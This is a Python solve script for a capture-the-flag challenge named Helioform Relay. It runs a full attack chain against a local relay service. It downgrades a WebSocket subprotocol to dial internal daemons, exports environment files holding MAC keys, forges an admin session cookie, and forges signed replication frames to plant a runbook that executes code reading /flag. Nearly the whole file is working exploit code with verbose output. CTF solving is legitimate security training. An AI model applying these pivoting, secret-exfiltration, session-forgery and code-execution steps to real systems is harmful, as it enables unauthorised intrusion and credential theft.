#!/usr/bin/env python3
"""Solve Helioform Relay and print every step, endpoint, payload, and state."""

import base64
import hashlib
import hmac
import http.client
import json
import os
import re
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 18080

OP_HELLO = 0x01
OP_DIAL = 0x10
OP_PEER_HELLO = 0x11
OP_TICKET = 0x20
OP_EXPORT = 0x30
OP_STATUS = 0x40
OP_BLOB = 0x17
OP_ERR = 0x7F

OP_NAMES = {
    OP_HELLO: "HELLO",
    0x02: "PING",
    0x03: "SUBSCRIBE",
    OP_DIAL: "DIAL",
    OP_PEER_HELLO: "PEER_HELLO",
    OP_BLOB: "COMMIT_BLOB",
    OP_TICKET: "ISSUE_TICKET",
    OP_EXPORT: "EXPORT",
    OP_STATUS: "STATUS",
    OP_ERR: "ERROR",
}

STEP = 0


def step(title):
    global STEP
    STEP += 1
    print("\n[%02d] %s" % (STEP, title))
    print("-" * 72)


def show_state(title, mapping):
    print("state: %s" % title)
    width = max(len(str(key)) for key in mapping) if mapping else 0
    for key, value in mapping.items():
        print("  %-*s = %s" % (width, key, value))


def hexdump(data, limit=256):
    if isinstance(data, str):
        data = data.encode()
    shown = data[:limit]
    lines = []
    for offset in range(0, len(shown), 16):
        chunk = shown[offset:offset + 16]
        words = " ".join("%02x" % byte for byte in chunk)
        text = "".join(chr(byte) if 32 <= byte < 127 else "." for byte in chunk)
        lines.append("  %04x  %-48s  %s" % (offset, words, text))
    if len(data) > limit:
        lines.append("  ... %d more bytes" % (len(data) - limit))
    return "\n".join(lines)


def show_payload(label, data):
    if isinstance(data, str):
        raw = data.encode()
        text = data
    else:
        raw = data
        text = data.decode("utf-8", "replace")
    print("%s (%d bytes)" % (label, len(raw)))
    printable = all(byte in (9, 10, 13) or 32 <= byte < 127 for byte in raw[:2000])
    if printable:
        clipped = text if len(text) <= 2000 else text[:2000] + "\n...[%d more chars]" % (len(text) - 2000)
        print(clipped if clipped.endswith("\n") or not clipped else clipped)
    print(hexdump(raw))


def show_frame(direction, opcode, flags, body):
    name = OP_NAMES.get(opcode, "OPCODE")
    print(
        "%s HSP %s opcode=0x%04x flags=0x%04x body_len=%d"
        % (direction, name, opcode, flags, len(body))
    )
    show_payload("  body", body)


def endpoint(method, path):
    return "%s http://%s:%s%s" % (method, HOST, PORT, path)


def html_bits(body):
    pres = re.findall(r"<pre[^>]*>(.*?)</pre>", body, re.S)
    rows = re.findall(r"<t[dh][^>]*>(.*?)</t[dh]>", body, re.S)
    chunks = []
    for block in pres:
        text = re.sub(r"<[^>]+>", "", block)
        text = text.replace("&lt;", "<").replace("&gt;", ">").replace("&amp;", "&")
        chunks.append(text.strip())
    interesting = [re.sub(r"<[^>]+>", "", row).strip() for row in rows]
    interesting = [row for row in interesting if row]
    return chunks, interesting


def show_http(method, path, status, body, request_body=b"", cookie=None):
    print("endpoint: %s" % endpoint(method, path))
    if cookie:
        print("request header: Cookie: hsp_session=%s" % cookie)
    if request_body:
        show_payload("request payload", request_body)
    else:
        print("request payload: <empty>")
    print("response: HTTP %s, %d bytes" % (status, len(body)))
    if "<html" in body.lower():
        blocks, rows = html_bits(body)
        if rows:
            print("response fields:")
            for row in rows:
                print("  %s" % row)
        for index, block in enumerate(blocks, 1):
            print("response <pre> #%d:" % index)
            print(block)
        if not blocks and not rows:
            print(body[:1500])
    else:
        show_payload("response payload", body)


def pack_frame(opcode, body):
    if isinstance(body, str):
        body = body.encode()
    frame = struct.pack("<4sHHI", b"HSP1", opcode, 0, len(body)) + body
    return frame


def show_wire(label, frame):
    magic, opcode, flags, length = struct.unpack_from("<4sHHI", frame)
    print(
        "%s wire: magic=%s opcode=0x%04x flags=0x%04x length=%d total=%d"
        % (label, magic.decode(), opcode, flags, length, len(frame))
    )
    show_payload(label + " frame", frame)


class Link:
    def __init__(self, host, port):
        print("tcp connect %s:%s" % (host, port))
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.buf = b""

    def close(self):
        print("tcp close")
        try:
            self.sock.close()
        except Exception:
            pass

    def send(self, data):
        self.sock.sendall(data)

    def read_exact(self, n):
        while len(self.buf) < n:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError("closed")
            self.buf += chunk
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def read_http(self):
        while b"\r\n\r\n" not in self.buf:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError("closed")
            self.buf += chunk
        index = self.buf.index(b"\r\n\r\n") + 4
        head, self.buf = self.buf[:index], self.buf[index:]
        return head.decode("iso-8859-1")

    def read_frame(self):
        header = self.read_exact(12)
        magic, opcode, flags, length = struct.unpack("<4sHHI", header)
        if magic != b"HSP1":
            raise RuntimeError("bad magic %r" % magic)
        body = self.read_exact(length) if length else b""
        show_frame("<<", opcode, flags, body)
        return opcode, flags, body


def ws_send(sock, payload):
    mask = os.urandom(4)
    masked = bytes(byte ^ mask[i % 4] for i, byte in enumerate(payload))
    n = len(payload)
    if n < 126:
        header = bytes([0x82, 0x80 | n])
    else:
        header = bytes([0x82, 0xFE]) + struct.pack(">H", n)
    print(">> websocket binary frame masked=1 payload_len=%d mask=%s" % (n, mask.hex()))
    sock.sendall(header + mask + masked)


def ws_recv(link):
    head = link.read_exact(2)
    opcode = head[0] & 0x0F
    length = head[1] & 0x7F
    if length == 126:
        length = struct.unpack(">H", link.read_exact(2))[0]
    elif length == 127:
        length = struct.unpack(">Q", link.read_exact(8))[0]
    masked = bool(head[1] & 0x80)
    if masked:
        mask = link.read_exact(4)
        data = link.read_exact(length)
        data = bytes(byte ^ mask[i % 4] for i, byte in enumerate(data))
    else:
        data = link.read_exact(length)
    print("<< websocket opcode=0x%02x masked=%s payload_len=%d" % (opcode, int(masked), length))
    return opcode, data


def upgrade(subprotocol):
    print("endpoint: %s" % endpoint("GET", "/mesh"))
    link = Link(HOST, PORT)
    key = base64.b64encode(os.urandom(16)).decode()
    req = (
        "GET /mesh HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        "Sec-WebSocket-Key: %s\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "Sec-WebSocket-Protocol: %s\r\n"
        "\r\n"
    ) % (HOST, key, subprotocol)
    show_payload("request payload", req)
    link.send(req.encode())
    head = link.read_http()
    status_line = head.split("\r\n", 1)[0]
    print("response: %s" % status_line)
    print(head.rstrip())
    if "101" not in status_line:
        raise RuntimeError("upgrade failed: %s" % status_line)
    show_state("websocket", {"subprotocol": subprotocol, "sec_websocket_key": key})
    return link


def http_call(method, path, cookie=None, body=b""):
    conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
    headers = {}
    if body:
        headers["Content-Length"] = str(len(body))
    if cookie:
        headers["Cookie"] = "hsp_session=" + cookie
    conn.request(method, path, body=body or None, headers=headers)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    status = resp.status
    conn.close()
    show_http(method, path, status, data, body, cookie)
    return status, data


def http_get(path, cookie=None):
    return http_call("GET", path, cookie=cookie)


def http_post(path, cookie=None, body=b""):
    return http_call("POST", path, cookie=cookie, body=body)


def kv(body):
    out = {}
    for line in body.decode("utf-8", "replace").splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            out[key.strip()] = value.strip()
    return out


def send_frame(link, opcode, body):
    if isinstance(body, str):
        body = body.encode()
    frame = pack_frame(opcode, body)
    show_frame(">>", opcode, 0, body)
    show_wire(">>", frame)
    link.send(frame)


def dial(target):
    print("dial target: %s" % target)
    link = upgrade("hsp.raw.1")
    send_frame(link, OP_HELLO, b"")
    _op, _flags, banner = link.read_frame()
    send_frame(link, OP_DIAL, target.encode())
    op, _flags, body = link.read_frame()
    if op == OP_ERR:
        link.close()
        raise RuntimeError(body.decode())
    show_state("spliced socket", {"transport": "hsp.raw.1", "upstream": target, "banner": banner.decode().strip()})
    return link, banner


def exchange(link, opcode, body):
    send_frame(link, opcode, body)
    op, _flags, reply = link.read_frame()
    if op == OP_ERR:
        raise RuntimeError(reply.decode("utf-8", "replace"))
    return reply


def main():
    print("Helioform Relay solve")
    show_state("target", {"host": HOST, "port": PORT, "flag_path": "/flag"})

    step("Read the public mesh contract")
    status, doc = http_get("/docs/hsp")
    assert status == 200 and "hsp.raw.1" in doc, "raw subprotocol is not documented"
    show_state("from /docs/hsp", {
        "customer_subprotocol": "hsp.ws.1",
        "agent_subprotocol": "hsp.raw.1",
        "framing": "HSP1 u16le opcode, u16le flags, u32le length",
    })

    step("Read the console session contract")
    status, session = http_get("/docs/session")
    assert status == 200 and "HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64)" in session
    show_state("from /docs/session", {
        "cookie": "hsp_session",
        "value": "base64url(json).hmac_sha256_hex",
        "role": "admin",
        "mac": "HMAC-SHA256(CONSOLE_MAC_KEY, payload_b64)",
    })

    step("Show that a normal WebSocket cannot DIAL")
    ws = upgrade("hsp.ws.1")
    dial_body = b"127.0.0.1:7710"
    frame = pack_frame(OP_DIAL, dial_body)
    show_frame(">>", OP_DIAL, 0, dial_body)
    show_wire(">>", frame)
    ws_send(ws.sock, frame)
    _ws_op, payload = ws_recv(ws)
    magic, op, flags, length = struct.unpack("<4sHHI", payload[:12])
    body = payload[12:12 + length]
    show_frame("<<", op, flags, body)
    assert op == OP_ERR and b"scope edge.dial required" in body, body
    ws.close()
    show_state("customer dial", {"result": "refused", "reason": body.decode().strip()})

    step("Downgrade to hsp.raw.1 and open catalogd")
    link, banner = dial("127.0.0.1:7710")
    assert b"DIAL:0x10" in banner
    catalog = exchange(link, OP_HELLO, b"")
    info = kv(catalog)
    show_state("catalogd HELLO", info)
    nonce = info["nonce"]
    ticket_body = exchange(link, OP_TICKET, nonce.encode())
    ticket_info = kv(ticket_body)
    ticket = ticket_info["ticket"]
    link.close()
    show_state("mesh ticket", {"nonce": nonce, "ticket": ticket, "ttl": ticket_info.get("ttl", "")})

    step("Confirm provd will not read /flag")
    link, _banner = dial("127.0.0.1:7711")
    denied_body = ("ticket=%s\npath=/flag\n" % ticket).encode()
    try:
        exchange(link, OP_EXPORT, denied_body)
        raise SystemExit("flag path should not export")
    except RuntimeError as exc:
        assert "dotenv" in str(exc), exc
        show_state("export /flag", {"result": "refused", "reason": str(exc).strip()})
    link.close()

    step("Export the factory environment")
    link, _banner = dial("127.0.0.1:7711")
    relay_body = ("ticket=%s\npath=/etc/helioform/relay.env\n" % ticket).encode()
    relay_env = exchange(link, OP_EXPORT, relay_body)
    link.close()
    secrets = kv(relay_env)
    assert "CONSOLE_MAC_KEY" in secrets
    show_state("relay.env", secrets)

    step("Export the collector environment")
    link, _banner = dial("127.0.0.1:7711")
    collector_body = ("ticket=%s\npath=/etc/helioform/collector.env\n" % ticket).encode()
    collector_env = exchange(link, OP_EXPORT, collector_body)
    link.close()
    collector = kv(collector_env)
    assert "REPLICATION_MAC_KEY" not in collector_env.decode()
    peer = collector["COLLECTOR_PEER"]
    show_state("collector.env", collector)

    step("Read the live ledger from recordd status")
    link, _banner = dial("127.0.0.1:7712")
    status_req = ("ticket=%s\n" % ticket).encode()
    status_body = exchange(link, OP_STATUS, status_req)
    ledger = kv(status_body)
    link.close()
    assert ledger["repl_port"] == "7713"
    show_state("recordd status", ledger)

    step("Forge the operator session")
    claims = {
        "iss": secrets["CONSOLE_ISS"],
        "aud": secrets["CONSOLE_AUD"],
        "role": "admin",
        "exp": int(time.time()) + 3600,
    }
    payload = json.dumps(claims, separators=(",", ":")).encode()
    payload_b64 = base64.urlsafe_b64encode(payload).decode().rstrip("=")
    mac = hmac.new(secrets["CONSOLE_MAC_KEY"].encode(), payload_b64.encode(), hashlib.sha256).hexdigest()
    cookie = payload_b64 + "." + mac
    show_payload("session json", payload)
    show_state("hsp_session", {
        "payload_b64": payload_b64,
        "mac_hex": mac,
        "cookie": cookie,
        "signed_with": "CONSOLE_MAC_KEY",
    })

    step("Reject an anonymous console request, then open runbooks")
    status, _denied = http_get("/console/automation")
    assert status == 401, status
    status, auto = http_get("/console/automation", cookie)
    assert status == 200, auto[:200]
    runbook_dir = re.search(r'id="runbook-dir">([^<]+)', auto).group(1)
    show_state("runbook scheduler", {"directory": runbook_dir, "header": "HSP-RUNBOOK"})

    step("Arm the peer trace and wait for one collector exchange")
    status, _armed = http_post("/console/trace", cookie)
    assert status == 200
    live = ""
    for poll in range(12):
        time.sleep(1)
        print("poll %d: waiting for mac_canonical hello and blob" % (poll + 1))
        status, live = http_get("/console/trace", cookie)
        if "mac_canonical=hsp-repl/1|hello|" in live and "mac_canonical=hsp-repl/1|blob|" in live:
            break
    else:
        raise SystemExit("peer trace did not capture a replication exchange")
    assert "u16 peer_len | peer | u32 epoch | tip[32] | mac[32]" in live
    hello_line = next(line for line in re.findall(r"mac_canonical=.*", live) if "|hello|" in line)
    blob_line = next(line for line in re.findall(r"mac_canonical=.*", live) if "|blob|" in line)
    show_state("trace grammar", {
        "hello_example": hello_line.strip(),
        "blob_example": blob_line.strip(),
        "note": "tip and bind in the trace are already stale; status is read again before the write",
    })

    step("Commit a runbook through the replication port")
    script = b"HSP-RUNBOOK\nimport pathlib\nprint(pathlib.Path('/flag').read_text())\n"
    stream_id = runbook_dir.rstrip("/") + "/intake.py"
    repl_key = secrets["REPLICATION_MAC_KEY"]
    show_payload("runbook file", script)
    show_state("write plan", {"stream_id": stream_id, "mode": "0x01 replace", "peer": peer})
    reply = b""
    for attempt in range(8):
        print("\nwrite attempt %d" % (attempt + 1))
        link, _banner = dial("127.0.0.1:7712")
        ledger = kv(exchange(link, OP_STATUS, ("ticket=%s\n" % ticket).encode()))
        link.close()
        epoch = int(ledger["epoch"])
        tip = ledger["tip"]
        bind = ledger["bind"]
        hello_can = "hsp-repl/1|hello|%s|%s|%s" % (epoch, tip, peer)
        hello_mac = hmac.new(repl_key.encode(), hello_can.encode(), hashlib.sha256).hexdigest()
        hello = struct.pack("<H", len(peer.encode())) + peer.encode()
        hello += struct.pack("<I", epoch) + bytes.fromhex(tip) + bytes.fromhex(hello_mac)
        body_sha = hashlib.sha256(script).hexdigest()
        blob_can = "hsp-repl/1|blob|%s|%s|%s|%s|%s" % (epoch, tip, bind, stream_id, body_sha)
        blob_mac = hmac.new(repl_key.encode(), blob_can.encode(), hashlib.sha256).hexdigest()
        blob = struct.pack("<H", len(stream_id.encode())) + stream_id.encode()
        blob += bytes([1]) + struct.pack("<I", epoch) + bytes.fromhex(tip) + bytes.fromhex(bind)
        blob += struct.pack("<I", len(script)) + script + bytes.fromhex(blob_mac)
        show_state("replication inputs", {
            "epoch": epoch,
            "tip": tip,
            "bind": bind,
            "hello_canonical": hello_can,
            "hello_mac": hello_mac,
            "body_sha256": body_sha,
            "blob_canonical": blob_can,
            "blob_mac": blob_mac,
        })
        link, _banner = dial("127.0.0.1:7713")
        try:
            exchange(link, OP_PEER_HELLO, hello)
            reply = exchange(link, OP_BLOB, blob)
        except RuntimeError as exc:
            link.close()
            show_state("attempt %d" % (attempt + 1), {"result": "retry", "reason": str(exc).strip()})
            continue
        link.close()
        show_state("commit", {"result": reply.decode().strip()})
        break
    else:
        raise SystemExit("replication write failed")

    step("Read the runbook output")
    for poll in range(10):
        status, auto = http_get("/console/automation", cookie)
        output = re.search(r'id="runbook-output">(.*?)</pre>', auto, re.S)
        text = output.group(1).strip() if output else ""
        found = re.search(r"CSCTF\{[^}]+\}", text)
        if found:
            show_state("runbook output", {"text": text})
            print(found.group(0))
            return
        print("poll %d: runbook output is %r" % (poll + 1, text or "empty"))
        time.sleep(0.5)
    raise SystemExit("runbook output missing flag")


if __name__ == "__main__":
    main()
